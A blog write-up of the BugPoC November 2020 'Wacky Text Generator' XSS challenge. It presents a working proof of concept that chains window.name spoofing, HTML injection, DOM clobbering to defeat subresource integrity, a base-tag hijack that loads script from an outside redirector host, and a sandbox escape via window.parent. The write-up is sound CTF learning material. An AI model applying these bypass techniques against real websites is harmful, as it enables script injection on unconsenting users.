---
layout: post
title: BugPoC 2020 November XSS Writeup
published: true
categories: [Web]
excerpt: I participated in this XSS Challenge due to my friend @stypr posting about it. It took me well over 2 hours to solve and I realized again how lacking my skills are. 
---

I participated in this XSS Challenge due to my friend @stypr posting about it. It took me well over 2 hours to solve and I realized again how lacking my skills are, compared to him who only took 20 minutes.

---

## Challenge

---

# Wacky Text Generator

#### Category: Web | 81 solves | 7-22 H1 Reputation

<details>
  <summary>Challenge Description</summary>
  
Check out our XSS CTF! Skip an Amazon Interview + $2k in prizes!
<br />
Submit solutions to  before 11/09 10PM EDT.
<br />
Rules: Must alert(origin), must bypass CSP, must work in Chrome, must provide a BugPoC demo
<br />
Good luck!
<br />
https://wacky.buggywebsite.com
</details>

## Step 1: Analyzing Page Source

Usually for this type of CTF challenges, there's no need for recon of subdomains. I hence opened the source code and immediately saw the point for HTML injection around Line 46:

```html
<div class="round-div">
	<span style="opacity:.5">Enter Boring Text:</span>
	<br>
	<textarea id="txt">Hello, World!</textarea>
	<div style="text-align: center;">
		<button id="btn">Make Whacky!</button>
	</div>
	<br>
	<iframe src="frame.html?param=Hello, World!" name="iframe" id="theIframe"></iframe>
</div>
```

Additionally, there seems to be a `script.js` at Line 64 defining the regex for the text we can write in the textbox, namely this function:

```javascript
document.getElementById("txt").onkeyup = function(){
this.value = this.value.replace(/[&*<>%]/g, '');
};
```

And we can also see that we control the value in the `iframe` directly, from this function call:

```javascript
document.getElementById('btn').onclick = function(){
val = document.getElementById('txt').value;
document.getElementById('theIframe').src = '/frame.html?param='+val;
};
```

## Step 2: Testing on the iframe directly
Since our point of injection is in the iframe, it makes sense to test it directly. Hence we can completely ignore the replacement function and open the page `https://wacky.buggywebsite.com/frame.html`, only to find out that there's a check for whether it's in an iframe.

However, looking at Line 189-190 of the page source code, we can see that this is easily bypassable:

```javascript
// verify we are in an iframe
if (window.name == 'iframe') {
```

Simply setting the `window.name` to `iframe` would let us trick the page into thinking that we are opening it from an iframe. 

Doing a [quick Google search](https://developer.mozilla.org/en-US/docs/Web/API/Window/name), we find that we can set this through `window.open()`. Thus, let's write this in our `poc.html` below:

```html
<input type="button" value="Click me" onclick="openPage();"></input>
<script>
function openPage() {
const windowName = "iframe";
const otherTab = window.open("https://wacky.buggywebsite.com/frame.html", windowName);
}
</script>
```

Clicking the button we just defined will successfully open the iframe a page we now partially control (the `windowName` variable). Upon checking the console, we see that a strange script `frame-analytics.js` that prints our User-Agent, OS and language has also been loaded automatically. 

![Frame Analytics](../assets/BugPoC/frame-analytics.js.png)

This must be a hint.

## Step 3: HTML Injection
Let's try adding `?param=Test` into our link and see what happens. 

![Param=test](../assets/BugPoC/param=test.png)

We've got an injection! 

Let's put in our custom XSS payload and see if it fires:

```javascript
function openPage() {
const windowName = "iframe";
var payload = "Test</title><script>alert(origin)<\/script>"
const otherTab = window.open("https://wacky.buggywebsite.com/frame.html?param="+payload, windowName);
}
```

Hmm, it doesn't seem to work. I wonder why?

## Error 1: Integrity Bypass

Checking the Developer Console, it turned out that there's a CSP which we have to bypass.

```
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-ojwxhtogmjlu' 'strict-dynamic'". Either the 'unsafe-inline' keyword, a hash ('sha256-sot4TsoYPMqH9HF0f7P0xsez7m6YnNiGcQWr7OJ6FBc='), or a nonce ('nonce-...') is required to enable inline execution.
```

So either we have to add the `unsafe-inline` keyword to the CSP which we don't control (not possible) or guess a nonce which is randomly generated (probably not possible), or add a hash to our script. Since we control the script, this option should be possible. Let's read the [page source](view-source:https://wacky.buggywebsite.com/frame.html) regarding the iframe again:

```javascript
// securely load the frame analytics code
if (fileIntegrity.value) {
	
	// create a sandboxed iframe
	analyticsFrame = document.createElement('iframe');
	analyticsFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
	analyticsFrame.setAttribute('class', 'invisible');
	document.body.appendChild(analyticsFrame);

	// securely add the analytics code into iframe
	script = document.createElement('script');
	script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
	script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
	script.setAttribute('crossorigin', 'anonymous');
	analyticsFrame.contentDocument.body.appendChild(script);
	
}
```

We can see that the script sets an attribute `integrity`, which is cast by `fileIntegrity.value` to the script that would allow us to bypass the CSP. Going back to the top of [Error 1](/BugPoC-2020-November-XSS/#error-1-integrity-bypass), we notice that the hash is actually given to us! So our hash for the current script is `sha256-sot4TsoYPMqH9HF0f7P0xsez7m6YnNiGcQWr7OJ6FBc=`. 

Using [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering), we are able to add the hash into our script like this:

```html
<input id='fileIntegrity' value='sot4TsoYPMqH9HF0f7P0xsez7m6YnNiGcQWr7OJ6FBc='>
```

To which it should work... but unfortunately didn't. What went wrong?

## Error 2: SRI Bypass

It was then I realised there was actually a second error. Was the error there before? I wasn't sure, but it seemed like a [Sub Resource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) error based on the description:

```
Failed to find a valid digest in the 'integrity' attribute for resource 'https://wacky.buggywebsite.com/files/analytics/js/frame-analytics.js' with computed SHA-256 integrity 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E='. The resource has been blocked.
```

Since we don't control the script, there seems to be no way to add our own integrity to it. Or do we? 

Let's take a look at how the `frame-analytics.js` is being loaded:

```javascript
script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
```

Hey, it's not an absolute URL! This means that we can actually load it on our host instead, using the [Document Base URL Element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base). Let's quickly use BugPoC's handy [Mock Endpoint Builder](https://bugpoc.com/testers/other/mock) to host our payload without using our own domain. 

![Mock Endpoint](../assets/BugPoC/mock-endpoint-2020-11-0.png)

CORS Header `"Access-Control-Allow-Origin": "*",` must be added as it is not by default, unlike Github Pages. 

Using the [Flexible Redirector](https://bugpoc.com/testers/other/redir), also by BugPoC, we can get a redirect link that would redirect with any path permutations. This means that if there happens to be some regex on the backend checking for file extensions, we can easily bypass it!

![Flexible Redirector](../assets/BugPoC/flexible-redirector-2020-11-0.png)

```javascript
var baseBypass = "<base href='https://luvedyp86epw.redir.bugpoc.ninja'>"
```

We'll have to calculate and replace the hash again as we've changed our script. Also, we'll have to actually create the `files/analytics/js/frame-analytics.js` on our domain so that it loads with our custom payload.

Which brings our current payload to this:

**poc.html**

```html
<input type="button" value="Click me" onclick="openPage();"></input>
<script>
function openPage() {
const windowName = "iframe";
let hash = "sot4TsoYPMqH9HF0f7P0xsez7m6YnNiGcQWr7OJ6FBc="
var integrityBypass = "<input id='fileIntegrity' value="+encodeURIComponent(hash)+">"
var baseBypass = "<base href='isopach.dev'>"
var payload = "Test</title>"+integrityBypass+baseBypass
const otherTab = window.open("https://wacky.buggywebsite.com/frame.html?param="+payload, windowName);}
</script>
```

**//luvedyp86epw.redir.bugpoc.ninja/files/analytics/js/frame-analytics.js**

```javascript
alert(origin)
```

And we have achieved XSS! 

## Error 3: Sandbox bypass 

However, the alert call was not triggered because of this error:

```
Ignored call to 'alert()'. The document is sandbox, and the 'allow-modals' keyword is not set.
```

Reading up on it, it seems that [sandboxed iframes will block modal dialogs by default](https://googlechrome.github.io/samples/block-modal-dialogs-sandboxed-iframe/). That makes sense security-wise, as I think I have never seen an alert popping from a ClickJacking iframe in the past when I was part of the Bug Bounty Team at my previous company. 

But reading up more on it, it seems that you can actually bypass this by simply adding `window.parent.` property to the alert call, *given that we control the parent window*.

Modifying the payload on our website:

```javascript
window.parent.alert(origin)
```

After changing the relevant hash mentioned above, we are finally able to achieve XSS and pop the origin alert!

## Final Payload

**poc.html**
```html
<input type="button" value="Click me" onclick="openPage();"></input>
<script>
function openPage() {
const windowName = "iframe";
let hash = "QkIPs1Inueee8IH+HXpScbWfI0zPgWJvCB9LGWZH/Wc="
var integrityBypass = "<input id='fileIntegrity' value="+encodeURIComponent(hash)+">"
var baseBypass = "<base href='https://syj51lgsbnsk.redir.bugpoc.ninja'>"
var payload = "Test</title>"+integrityBypass+baseBypass
const otherTab = window.open("https://wacky.buggywebsite.com/frame.html?param="+payload, windowName);}
</script>
```

**//syj51lgsbnsk.redir.bugpoc.ninja/files/analytics/js/frame-analytics.js**
```javascript
window.parent.alert(origin)
```

Let's quickly [host our PoC on BugPoC](https://bugpoc.com/testers/front-end) for submission:

![Front-End PoC](../assets/BugPoC/front-end-poc-2020-11.png)

Click "Publish" to receive a password-protected link. You can check out mine below:

[Link](https://bugpoc.com/poc#bp-ouCwdDrt)    
Password: ePicmule05

**If the PoC doesn't work for you for unknown reasons, remember to disable your plugins and addons. I recommend running it in Incognito Mode on Chrome.**

## Flag

![Flag](../assets/BugPoC/flag-2020-11.png)

That was a fun challenge. 

<details>
  <summary>Note</summary>
Despite the constant use of 'we' and 'our', this challenge was done solo by yours truly, like many other CTF writeups on this blog. <br />     
</details>

***